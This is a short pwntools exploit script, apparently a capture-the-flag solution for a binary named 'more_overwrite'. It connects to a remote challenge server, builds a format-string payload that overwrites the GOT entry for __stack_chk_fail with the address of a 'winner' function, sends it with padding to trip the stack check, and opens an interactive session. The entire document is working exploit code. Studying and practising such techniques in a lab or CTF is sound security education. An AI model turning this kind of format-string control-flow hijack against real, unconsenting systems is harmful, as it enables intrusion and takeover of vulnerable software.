from pwn import *
# p = process("./more_overwrite")
p = remote("34.213.62.140",6503)
# gdb.attach(p,"init-pwndbg")
elf = context.binary = ELF("./more_overwrite")
payload = fmtstr_payload(6,{elf.got.__stack_chk_fail :elf.sym.winner})


p.recvline()
p.recvline()
p.sendline(payload+b'a'*100)
# p.recvline()
p.interactive()